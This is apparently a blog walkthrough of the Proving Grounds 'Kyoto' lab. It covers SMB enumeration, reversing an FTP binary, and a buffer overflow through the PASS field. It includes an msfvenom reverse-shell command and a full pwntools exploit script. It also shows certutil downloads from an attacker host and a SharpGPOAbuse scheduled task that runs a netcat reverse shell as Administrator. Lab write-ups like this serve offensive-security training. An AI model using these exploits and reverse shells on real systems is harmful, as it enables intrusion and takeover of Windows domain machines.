---
title: Kyoto
date: 2026-02-17T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - ftp
  - SharpGPOAbuse
  - GPO
  - active directory
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Kyoto"
---

"Humans have both the urge to create and destroy.
Hayao Miyazaki

`nmap -sS -sC  -sV -p- 192.168.119.31 --min-rate 500`

![](Screenshot%202026-02-19%20at%2011.48.01.png)
![](Screenshot%202026-02-19%20at%2011.48.23.png)

enum4linux-ng 192.168.119.31

SMB
NetBIOS computer name: KYOTO                                                                                        
NetBIOS domain name: KYOTOSOFT                                                                                      
DNS domain: Kyotosoft.com                                                                                           
FQDN: kyoto.Kyotosoft.com                                                                                           
Derived membership: domain member                                                                                   
Derived domain: KYOTOSOFT  

`smbclient -L \\192.168.180.31`

`smbclient \\\\192.168.180.31\\dev`

![](Screenshot%202026-02-22%20at%2009.45.36.png)

![](Screenshot%202026-02-22%20at%2010.09.54.png)

![](Screenshot%202026-02-22%20at%2010.28.36.png)

Start Ghirdra, create a project in the kyoto folder and import ftp.exe

Search > Memory

We know that there was a vulnerability in the RETR command but we'll also search for DEBUG. 

![](Screenshot%202026-02-22%20at%2010.47.42.png)

![](Screenshot%202026-02-22%20at%2010.46.38.png)

![](Screenshot%202026-02-22%20at%2010.46.09.png)

There is a guide that I followed to understand the reverse engineering workflow:
https://medium.com/@0xrave/kyoto-proving-grounds-practice-walkthrough-active-directory-820dfcff5ddd

I still have a lot to learn on this subject. 

The offset is 270, now we can build an exploit;

-----------

Create a msfvenom payload:

msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST={Kali IP} LPORT=1234 -f python -v sc

Copy the code below(it definitely works):
- Insert your payload
- Change the IP address on line 43 to the IP of your victim machine.

`
#!/usr/bin/python

from pwn import *
context.log_level = 'debug' 

{put created payload here}

buf = b""
buf += b"A"*270
buf += p32(0x004016be)
buf += sc

p = remote('192.168.246.31', 21, level='debug')

p.recvuntil(b"220")
p.sendline(b"USER Banana")
p.recvuntil(b"331")
p.sendline(b"PASS " + buf) 
p.interactive()
`

It should look something like this:

![](Screenshot%202026-03-17%20at%2013.33.47.png)

Start a listener on port 1234

`rlwrap -lnvp nc 1234`

Run the exploit

![](Screenshot%202026-03-17%20at%2012.49.19.png)


![](Screenshot%202026-03-17%20at%2012.21.53.png)


Once you're in you can use winpeas. `whoami` will return the user: support. Run `net users support` and it will show that this user is a 'Group Policy Creator'

This tool will uses these rights create a 'Computer Task' that will execute a command on behalf of the Administrator - once the policies have been updated: https://github.com/byronkg/SharpGPOAbuse/blob/main/SharpGPOAbuse-master/README.md

Download the latest release:

![](Screenshot%202026-03-17%20at%2012.38.05.png)

Download there executables onto the victim machine:  
`certutil -f -urlcache http://192.168.45.194/SharpGPOAbuse.exe SGPO.exe`  
`certutil -f -urlcache http://192.168.45.194/nc64.exe nc.exe`

![](Screenshot%202026-03-17%20at%2012.20.05.png)

Start a listener on your kali machine:  
`rlwrap nc -lvnp 123` 

On your victim windows machine:  
`SGPO.exe --AddComputerTask --TaskName "test" --Author "Administrator" --Command "cmd.exe" --Arguments "/c c:\temp\nc.exe 192.168.45.194 123 -e cmd.exe" --GPOName "Default Domain Policy"`

`gpupdate /force`

![](Screenshot%202026-03-17%20at%2012.19.37.png)

